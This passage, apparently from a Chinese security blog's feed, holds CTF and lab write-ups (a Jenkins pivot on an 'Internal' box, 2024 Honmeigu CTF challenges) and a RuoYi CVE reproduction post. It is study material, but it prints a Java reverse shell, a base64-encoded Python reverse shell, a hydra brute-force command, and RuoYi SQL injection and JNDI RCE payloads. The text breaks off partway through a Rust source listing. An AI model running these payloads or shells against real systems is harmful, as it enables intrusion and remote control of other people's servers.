alt="image-20240405124909767"></p><p>继续找，发现在opt文件夹中有一个txt文件</p><p>这里应该是写到了账号密码，进行提权</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151258351.png" alt="image-20240405125200608"></p><p>提权成功</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151258387.png" alt="image-20240405125252999"></p><p>这里先获取flag，然后再看看另外两个文件</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151258912.png" alt="image-20240405125548434"></p><p>(snap应该就相当于那个应用商城，没什么用)</p><p>可以看到jenkins运行在172.17这个网段上，这是一个私人ip地址，我们是无法在外界访问的，我们只能通过目标机进行连接</p><hr><p>互联网数字分配机构（IANA）指定了特定的IPv4地址范围供私人使用。这些范围适用于全球数百万个私有网络，包括全球数百万个私有网络，分为以下几类：</p><p>A类：10.0.0.0–10.255.255.255</p><p>B类：172.16.0.0–172.31.255.255</p><p>C类：192.168.0.0–192.168.255.255</p><hr><p>这里我们需要ssh连上目标机再连172这台</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> -f -N -L <span class="hljs-number">4567</span>:<span class="hljs-number">172.17.0.2:8080</span> aubreanna<span class="hljs-variable">@internal</span>.thm<br></code></pre></td></tr></table></figure><p>这个指令可以将流量重定向到本机的4567端口，然后我们就可以进行访问</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151258425.png" alt="image-20240405131322992"></p><p><strong><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151258791.png" alt="image-20240405131334894"></strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hydra</span> -l admin -P /usr/share/wordlists/rockyou.txt -s <span class="hljs-number">4567</span> <span class="hljs-number">127.0.0.1</span> http-post-form <span class="hljs-string">&quot;/j_acegi_security_check:j_username=admin&amp;j_password=^PASS^&amp;from=%2F&amp;Submit=Sign+in&amp;Login=Login:Invalid username or password&quot;</span><br></code></pre></td></tr></table></figure><p>开始爆破</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151258912.png" alt="image-20240405131736193"></p><p>得到密码spongebob</p><p>老样子登录进后台</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151258662.png" alt="image-20240405131852222"></p><p>上传shell</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">String <span class="hljs-attribute">host</span>=<span class="hljs-string">&quot;10.13.54.129&quot;</span>;<br>int <span class="hljs-attribute">port</span>=3344;<br>String <span class="hljs-attribute">cmd</span>=<span class="hljs-string">&quot;/bin/bash&quot;</span>;<br>Process <span class="hljs-attribute">p</span>=new ProcessBuilder(cmd).redirectErrorStream(<span class="hljs-literal">true</span>).start();Socket <span class="hljs-attribute">s</span>=new Socket(host,port);InputStream <span class="hljs-attribute">pi</span>=p.getInputStream(),pe=p.getErrorStream(), <span class="hljs-attribute">si</span>=s.getInputStream();OutputStream <span class="hljs-attribute">po</span>=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed())&#123;<span class="hljs-keyword">while</span>(pi.available()&gt;0)so.write(pi.read());<span class="hljs-keyword">while</span>(pe.available()&gt;0)so.write(pe.read());<span class="hljs-keyword">while</span>(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try &#123;p.exitValue();break;&#125;catch (Exception e)&#123;&#125;&#125;;p.destroy();s.close();<br></code></pre></td></tr></table></figure><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151258311.png" alt="image-20240405134758777"></p><p>成功连上</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151258154.png" alt="image-20240405134855089"></p><p>拿到root账号密码，ssh进行连接</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151258481.png" alt="image-20240405134948572"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151258529.png" alt="image-20240405135009966"></p><p>完成</p>]]></content>
    
    
    <categories>
      
      <category>打靶</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>新版ruoyi漏洞分析与复现</title>
    <link href="/2024/09/15/%E8%8B%A5%E4%BE%9D/"/>
    <url>/2024/09/15/%E8%8B%A5%E4%BE%9D/</url>
    
    <content type="html"><![CDATA[<h1 id="XSS-SQL-CVE-2024-42900，未完全修复的CVE-2022-4566"><a href="#XSS-SQL-CVE-2024-42900，未完全修复的CVE-2022-4566" class="headerlink" title="XSS&#x2F;SQL(CVE-2024-42900，未完全修复的CVE-2022-4566)"></a>XSS&#x2F;SQL(CVE-2024-42900，未完全修复的CVE-2022-4566)</h1><h2 id="可用版本"><a href="#可用版本" class="headerlink" title="可用版本:"></a>可用版本:</h2><p>&lt;&#x3D;4.7.9(截止2024.9.14最新版本就是4.7.9)，其中CVE-2022-4566是&lt;&#x3D;4.7.5</p><h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害:"></a>漏洞危害:</h2><p>Ruoyi v4.7.9 及之前版本通过 &#x2F;tool&#x2F;gen&#x2F;create 的 createTable（） 函数的 sql 参数发现存在跨站脚本 （XSS） 漏洞。<br>我看网上对这个洞的评价普遍是鸡肋，因为他的功能就是在数据库里建个表，填数据，还有就是能打一个时间盲注，这里就简单复现下</p><h2 id="源码"><a href="#源码" class="headerlink" title="源码:"></a>源码:</h2><p><a href="https://gitee.com/y_project/RuoYi/releases/tag/v4.7.9">v4.7.9 · 若依&#x2F;RuoYi - Gitee.com</a></p><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置:"></a>环境配置:</h2><p>导入新的两个数据库<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409142059521.png" alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409142059044.png" alt="image.png"><br>修改库名账号密码</p><h2 id="漏洞定位"><a href="#漏洞定位" class="headerlink" title="漏洞定位:"></a>漏洞定位:</h2><p>系统工具-&gt;代码生成-&gt;创建<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409142318151.png" alt="image.png"></p><h2 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h2><p>普通查询：<br><code>CREATE TABLE q1234asdf AS SELECT/**/ lock_name FROM/**/ qrtz_locks WHERE/**/ 1 = 1 UNION/**/ SELECT/**/ VERSION();</code><br>这个其实我没感觉有什么用，因为你用这个脚本就是把version输入到一个新的表q1234asdf里，你又看不到内容，还得要管理员权限去看数据库才能看到version，那意义是什么<br>时间盲注：<br>有两种，都能成功的延迟，说明可能真的能打出时间盲注，爆库爆表，但这里每次盲注都会创建一个新的表，污染数据库太严重了，我感觉实用性也不是特别高，而且很麻烦<br><code>create table test as select/**/* from sys_job where 1=1 union select/**/sleep(10),2,3,4,5,6,7,8,9,10,11,12,13;</code></p><p><code>create table tb_tmp011222(id INT(11),name VARCHAR(25),deptId INT(11),salary FLOAT) /*!select*/  /*!select*/ /*!sleep(3)*/</code></p><h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程:"></a>利用过程:</h2><p>这个是普通查询的结果，事实证明这里确实存在漏洞<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409142341673.png" alt="image.png"><br>时间盲注确实存在延迟<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409142334727.png" alt="image.png"></p><h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p><a href="https://mp.weixin.qq.com/s/SkPMZD-jGXkhH6Ias-QBmg">https://mp.weixin.qq.com/s/SkPMZD-jGXkhH6Ias-QBmg</a><br><a href="https://mp.weixin.qq.com/s/u6RM6ytlc7voZ8lv0C0oaw">https://mp.weixin.qq.com/s/u6RM6ytlc7voZ8lv0C0oaw</a><br><a href="https://g03m0n.github.io/posts/cve-2024-42900/">Rouyi 框架 ≤ v4.7.9 的盲目 SQL 注入 - g03m0n — Blind SQL Injection at Rouyi framework ≤ v4.7.9 - g03m0n</a><br>CVE-2022-4566<br><a href="https://g03m0n.github.io/posts/cve-2022-4566/">CVE-2022-4566 - g03m0n 漏洞 — CVE-2022-4566 - g03m0n</a></p><h1 id="SQL注入-CVE-2024-42913"><a href="#SQL注入-CVE-2024-42913" class="headerlink" title="SQL注入(CVE-2024-42913)"></a>SQL注入(CVE-2024-42913)</h1><p>&lt;&#x3D;4.7.9(截止2024.9.14最新版本就是4.7.9)<br>网上没有找到复现或分析文章，找到的都是标着42913但我感觉是42900的文章，CVE给出的节点我也没找到<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409141855278.png" alt="image.png"><br>而且能找到的job_id全都进行了预编译(可能是in参数那里出了问题？但in也要$才存在注入的吧)<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409141857969.png" alt="image.png"><br>我没找到能sql注入的点，等以后漏洞公开了我再进行复现</p><h1 id="SQL注入-命令执行"><a href="#SQL注入-命令执行" class="headerlink" title="SQL注入+命令执行"></a>SQL注入+命令执行</h1><h2 id="可用版本："><a href="#可用版本：" class="headerlink" title="可用版本："></a>可用版本：</h2><p>&lt;&#x3D;4.7.8(要有定时任务，而且定时任务可以调用目标字符串)</p><h2 id="漏洞危害："><a href="#漏洞危害：" class="headerlink" title="漏洞危害："></a>漏洞危害：</h2><p>弹计算器</p><h2 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h2><p><a href="https://gitee.com/y_project/RuoYi/releases">RuoYi 发行版 - Gitee.com</a><br>这里我们采用4.7.8进行复现</p><h2 id="环境配置："><a href="#环境配置：" class="headerlink" title="环境配置："></a>环境配置：</h2><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409141529386.png" alt="image.png"><br>mysql导入这两个文件<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409141530764.png" alt="image.png"><br>修改数据库名，账号密码<br>使用jdk1.8版本</p><h2 id="漏洞定位："><a href="#漏洞定位：" class="headerlink" title="漏洞定位："></a>漏洞定位：</h2><p>系统监控-&gt;定时任务-&gt;调用目标字符串<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409141531579.png" alt="image.png"></p><h2 id="payload："><a href="#payload：" class="headerlink" title="payload："></a>payload：</h2><h3 id="sql注入："><a href="#sql注入：" class="headerlink" title="sql注入："></a>sql注入：</h3><p><code>genTableServiceImpl.createTable(&#39;UPDATE sys_job SET invoke_target = &#39;Hack By suuuu&#39; WHERE job_id = 1;&#39;)</code></p><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE:"></a>RCE:</h3><p><code>genTableServiceImpl.createTable(&#39;UPDATE sys_job SET invoke_target = 0x WHERE job_id = 2;&#39;)</code><br>0x后面跟16进制后的rce命令<br>如：<br><code>javax.naming.InitialContext.lookup(&#39;ldap://xxx.dnslog.cn&#39;)</code><br>16进制转换：<code>6a617661782e6e616d696e672e496e697469616c436f6e746578742e6c6f6f6b757028276c6461703a2f2f7878782e646e736c6f672e636e2729</code><br>那么命令就是<br><code>genTableServiceImpl.createTable(&#39;UPDATE sys_job SET invoke_target = 0x6a617661782e6e616d696e672e496e697469616c436f6e746578742e6c6f6f6b757028276c6461703a2f2f7878782e646e736c6f672e636e2729 WHERE job_id = 1;&#39;)</code></p><h2 id="利用过程："><a href="#利用过程：" class="headerlink" title="利用过程："></a>利用过程：</h2><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409142042538.png" alt="image.png"><br>把payload放到调用目标字符串即可</p><h2 id="一键利用工具："><a href="#一键利用工具：" class="headerlink" title="一键利用工具："></a>一键利用工具：</h2><p><a href="https://github.com/charonlight/RuoYiExploitGUI">charonlight&#x2F;RuoYiExploitGUI: 若依最新定时任务SQL注入可导致RCE漏洞的一键利用工具 (github.com)</a></p><p><a href="https://github.com/cckuailong/JNDI-Injection-Exploit-Plus">cckuailong&#x2F;JNDI-Injection-Exploit-Plus: 80+ Gadgets(30 More than ysoserial). JNDI-Injection-Exploit-Plus is a tool for generating workable JNDI links and provide background services by starting RMI server,LDAP server and HTTP server. (github.com)</a><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409142025711.png"><br>记得加个cookie<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409142026496.png" alt="image.png"><br>这里注意下面这个JNDI工具要用jdk1.8，不然弹不出来<br><code>java -jar JNDI-Injection-Exploit-Plus-2.3-SNAPSHOT-all.jar -A 192.168.231.42 -C &quot;calc&quot;</code><br>开弹！<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409142038863.png" alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409142041623.png" alt="image.png"></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>若依</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>近期CTF的学习与复现</title>
    <link href="/2024/09/14/%E8%BF%91%E6%9C%9FCTF%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2024/09/14/%E8%BF%91%E6%9C%9FCTF%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="2024红明谷杯"><a href="#2024红明谷杯" class="headerlink" title="2024红明谷杯"></a>2024红明谷杯</h1><h2 id="EZPHP"><a href="#EZPHP" class="headerlink" title="EZPHP"></a>EZPHP</h2><p>题目描述：<code>一支专注于卫星通信技术的研究团队正在努力改进他们的通信系统，以提高数据传输的效率和安全性，团队决定采用PHP 8.3.2来完善通信系统开发。</code><br>它题目专门强调了php 8.3.2，那我们本地复现也最好搭一个8.3.2<br>docker run -itd -p 1234:80 php:8.3.2-apache<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409111822986.png" alt="image.png"><br>php filter chain oracle<br>原理比较复杂，这里不多解释，反正看到下面的函数，你就想这个漏洞就对了</p><table><thead><tr><th>函数</th><th>示例</th></tr></thead><tbody><tr><td><strong><em>file_get_contents</em></strong></td><td><code>file_get_contents($_POST[0]);</code></td></tr><tr><td><strong><em>readfile</em></strong></td><td><code>readfile($_POST[0]);</code></td></tr><tr><td><strong><em>finfo-&gt;file</em></strong></td><td><code>$file = new finfo(); $fileinfo = $file-&gt;file($_POST[0], FILEINFO_MIME);</code></td></tr><tr><td><strong><em>getimagesize</em></strong></td><td><code>getimagesize($_POST[0]);</code></td></tr><tr><td><strong><em>md5_file</em></strong></td><td><code>md5_file($_POST[0]);</code></td></tr><tr><td><strong><em>sha1_file</em></strong></td><td><code>sha1_file($_POST[0]);</code></td></tr><tr><td><strong><em>hash_file</em></strong></td><td><code>hash_file(&#39;md5&#39;, $_POST[0]);</code></td></tr><tr><td><strong><em>file</em></strong></td><td><code>file($_POST[0]);</code></td></tr><tr><td><strong><em>parse_ini_file</em></strong></td><td><code>parse_ini_file($_POST[0]);</code></td></tr><tr><td><strong><em>copy</em></strong></td><td><code>copy($_POST[0], &#39;/tmp/test&#39;);</code></td></tr><tr><td><strong><em>file_put_contents (only target read only with this)</em></strong></td><td><code>file_put_contents($_POST[0], &quot;&quot;);</code></td></tr><tr><td><strong><em>stream_get_contents</em></strong></td><td><code>$file = fopen($_POST[0], &quot;r&quot;); stream_get_contents($file);</code></td></tr><tr><td><strong><em>fgets</em></strong></td><td><code>$file = fopen($_POST[0], &quot;r&quot;); fgets($file);</code></td></tr><tr><td><strong><em>fread</em></strong></td><td><code>$file = fopen($_POST[0], &quot;r&quot;); fread($file, 10000);</code></td></tr><tr><td><strong><em>fgetc</em></strong></td><td><code>$file = fopen($_POST[0], &quot;r&quot;); fgetc($file);</code></td></tr><tr><td><strong><em>fgetcsv</em></strong></td><td><code>$file = fopen($_POST[0], &quot;r&quot;); fgetcsv($file, 1000, &quot;,&quot;);</code></td></tr><tr><td><strong><em>fpassthru</em></strong></td><td><code>$file = fopen($_POST[0], &quot;r&quot;); fpassthru($file);</code></td></tr><tr><td><strong><em>fputs</em></strong></td><td><code>$file = fopen($_POST[0], &quot;rw&quot;); fputs($file, 0);</code></td></tr><tr><td>直接拿工具打</td><td></td></tr><tr><td><a href="https://github.com/synacktiv/php_filter_chains_oracle_exploit">https://github.com/synacktiv/php_filter_chains_oracle_exploit</a></td><td></td></tr><tr><td><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409111848010.png" alt="image.png"></td><td></td></tr><tr><td>截图这里不知道为什么吞了部分内容，这里重新写下语句</td><td></td></tr><tr><td><code>python filters_chain_oracle_exploit.py --target http://192.168.56.136:1234/hmg/ --file flag.php --parameter f --time_based_attack True --match &quot;Allowed memory size&quot;</code></td><td></td></tr><tr><td>这里解释下各个参数的含义</td><td></td></tr><tr><td>–target url</td><td></td></tr><tr><td>–file 要读取的文件</td><td></td></tr><tr><td>–paramater post的参数，从题目可以看到这里post一个f</td><td></td></tr><tr><td>–time_based_attack True 使用时间盲注</td><td></td></tr><tr><td>–match “Allowed memory size” 在响应中匹配特定的字符串或模式，作为判断是否成功注入的标志</td><td></td></tr><tr><td>在这里看有点累</td><td></td></tr><tr><td><code>if (isset($_GET[\&#39;ezphpPhp8\&#39;])) &#123;\n    highlight_file(__FILE__);\n&#125;</code></td><td></td></tr><tr><td>从这句可以看出传个参就能highlight</td><td></td></tr><tr><td><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409111853811.png" alt="image.png"></td><td></td></tr><tr><td>到这里还记得题目强调的php版本是8.3.2吗，看到他传参也是php8，我们猜这里有什么特别的地方，我们就去搜php8.3.2的特别之处</td><td></td></tr><tr><td><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409111907320.png" alt="image.png"></td><td></td></tr><tr><td>这题后面环境疯狂报错，复现失败，放弃了</td><td></td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ezphpPhp8&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;No&quot;</span>);<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-class"><span class="hljs-keyword">class</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getflag</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<br>    &#125;<br>&#125;;<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$c</span>=<span class="hljs-title function_ invoke__">get_declared_classes</span>();<br><span class="hljs-comment">//c用urlencode  输出最后一个  //有不可见字符</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$c</span>[<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$c</span>)-<span class="hljs-number">1</span>]);<br><span class="hljs-variable">$f</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$a</span>();<br><span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">getflag</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这个跑出脚本<br>然后用就行了，如果不出那就是最后那个数字改一下就好，或者把题目重启<br>再学习下匿名类相关知识<br><a href="https://hi-arkin.com/archives/php-anonymous-stdClass.html">https://hi-arkin.com/archives/php-anonymous-stdClass.html</a></p><h2 id="unauth"><a href="#unauth" class="headerlink" title="unauth"></a>unauth</h2><p>这题主要学习下它的命令执行，这题原本是应该反弹shell，然后拿到账号密码登录提权，cat &#x2F;flag的因为我没有再重新起个完整的服务，这里就不进行后面的步骤了<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409111950733.png" alt="image.png"><br>打开需要输入账号密码，先试试弱口令爆破<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409111953308.png" alt="image.png"><br>没跑出来，跑一下路径<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409111955210.png" alt="image.png"><br>扫到两个，这里肯定是先看<a href="http://www.zip/">www.zip</a><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409111956182.png" alt="image.png"><br>得到账号密码<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409111957706.png" alt="image.png"><br>到这里我才想起来我没有改php配置，我可以随便命令执行，那干脆看看别人的wp学习下好了<br>这里的php剩了个pcntl_exec，至于怎么发现的则是读取&#x2F;usr&#x2F;local&#x2F;etc&#x2F;php&#x2F;php.ini<br><code>pcntl_exec(&#39;/usr/bin/python&#39;,[&#39;-c&#39;,base64_decode(&#39;aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEyMy4xMjMuMTIzLjEyMyIsMTIzNCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtpbXBvcnQgcHR5OyBwdHkuc3Bhd24oInNoIik=&#39;)]);</code><br>这是反弹shell的语句</p><h2 id="playground"><a href="#playground" class="headerlink" title="playground"></a>playground</h2><p>rust代码审计，这里不是很会搭环境，简单学习下这道题好了</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-meta">#[macro_use]</span> <span class="hljs-keyword">extern</span> <span class="hljs-keyword">crate</span> rocket;<br><br><span class="hljs-keyword">use</span> std::fs;<br><span class="hljs-keyword">use</span> std::fs::File;<br><span class="hljs-keyword">use</span> std::io::Write;<br><span class="hljs-keyword">use</span> std::process::Command;<br><span class="hljs-keyword">use</span> rand::Rng;<br><br><span class="hljs-meta">#[get(<span class="hljs-string">&quot;/&quot;</span>)]</span><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">index</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">String</span> &#123;<br>    fs::<span class="hljs-title function_ invoke__">read_to_string</span>(<span class="hljs-string">&quot;main.rs&quot;</span>).<span class="hljs-title function_ invoke__">unwrap_or</span>(<span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">default</span>())<br>&#125;<br><br><span class="hljs-meta">#[post(<span class="hljs-string">&quot;/rust_code&quot;</span>, data = <span class="hljs-string">&quot;&lt;code&gt;&quot;</span>)]</span><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">run_rust_code</span>(code: <span class="hljs-type">String</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">String</span>&#123;<br>    <span class="hljs-keyword">if</span> code.<span class="hljs-title function_ invoke__">contains</span>(<span class="hljs-string">&quot;std&quot;</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Error: std is not allowed&quot;</span>.<span class="hljs-title function_ invoke__">to_string</span>();<br>    &#125;<br>    <span class="hljs-comment">//generate a random 5 length file name</span><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">file_name</span> = rand::<span class="hljs-title function_ invoke__">thread_rng</span>()<br>        .<span class="hljs-title function_ invoke__">sample_iter</span>(&amp;rand::distributions::Alphanumeric)<br>        .<span class="hljs-title function_ invoke__">take</span>(<span class="hljs-number">5</span>)<br>        .<span class="hljs-title function_ invoke__">map</span>(<span class="hljs-type">char</span>::from)<br>        .collect::&lt;<span class="hljs-type">String</span>&gt;();<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> <span class="hljs-variable">Ok</span>(<span class="hljs-keyword">mut</span> file) = File::<span class="hljs-title function_ invoke__">create</span>(<span class="hljs-built_in">format!</span>(<span class="hljs-string">&quot;playground/&#123;&#125;.rs&quot;</span>, &amp;file_name)) &#123;<br>        file.<span class="hljs-title function_ invoke__">write_all</span>(code.<span class="hljs-title function_ invoke__">as_bytes</span>());<br>    &#125;<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> <span class="hljs-variable">Ok</span>(build_output) = Command::<span class="hljs-title function_ invoke__">new</span>(<span class="hljs-string">&quot;rustc&quot;</span>)<br>        .<span class="hljs-title function_ invoke__">arg</span>(<span class="hljs-built_in">format!</span>(<span class="hljs-string">&quot;playground/&#123;&#125;.rs&quot;</span>,&amp;file_name))<br>        .<span class="hljs-title function_ invoke__">arg</span>(<span class="hljs-string">&quot;-C&quot;</span>)<br>        .<span class="hljs-title function_ invoke__">arg</span>(<span class="hljs-string">&quot;debuginfo=0&quot;</span>)<br>        .<span class="hljs-title function_ invoke__">arg</span>(<span class="hljs-string">&quot;-C&quot;</span>)<br>        .<span class="hljs-title function_ invoke__">arg</span>(<span class="hljs-string">&quot;opt-level=3&quot;</span>)<br>        .<span class="hljs-title function_ invoke__">arg</span>(<span class="hljs-string">&quot;-o&quot;</span>)<br>        .<span class="hljs-title function_ invoke__">arg</span>(<span class="hljs-built_in">format!</span>(<span class="hljs-string">&quot;playground/&#123;&#125;&quot;</span>,&amp;file_name))<br>        .<span class="hljs-title function_ invoke__">output</span>() &#123;<br>        <span class="hljs-keyword">if</span> !build_output.status.<span class="hljs-title function_ invoke__">success</span>()&#123;<br>            fs::<span class="hljs-title function_ invoke__">remove_file</span>(<span class="hljs-built_in">format!</span>(<span class="hljs-string">&quot;playground/&#123;&#125;.rs&quot;</span>,&amp;file_name));<br>            <span class="hljs-keyword">return</span> <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from_utf8_lossy</span>(build_output.stderr.<span class="hljs-title function_ invoke__">as_slice</span>()).<span class="hljs-title function_ invoke__">to_string</span>();<br>        &#125;<br>    &#125;<br>    fs::<span class="hljs-title function_ invoke__">remove_file</span>(<span class="hljs-built_in">format!</span>(<span class="hljs-string">&quot;playground/&#123;&#125;.rs&quot;</span>,&amp;file_name));<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> <span class="hljs-variable">Ok</span>(output) = Command::<span class="hljs-title function_ invoke__">new</span>(<span class="hljs-built_in">format!</span>(<span class="hljs-string">&quot;playground/&#123;&#125;&quot;</span>,&amp;file_name))<br>        .<span class="hljs-title function_ invoke__">output</span>() &#123;<br>        <span class="hljs-keyword">if</span> !output.status.<span class="hljs-title function_ invoke__">success</span>()&#123;<br>            fs::<span class="hljs-title function_ invoke__">remove_file</span>(<span class="hljs-built_in">format!</span>(<span class="hljs-string">&quot;playground/&#123;&#125;&quot;</span>,&amp;file_name));<br>            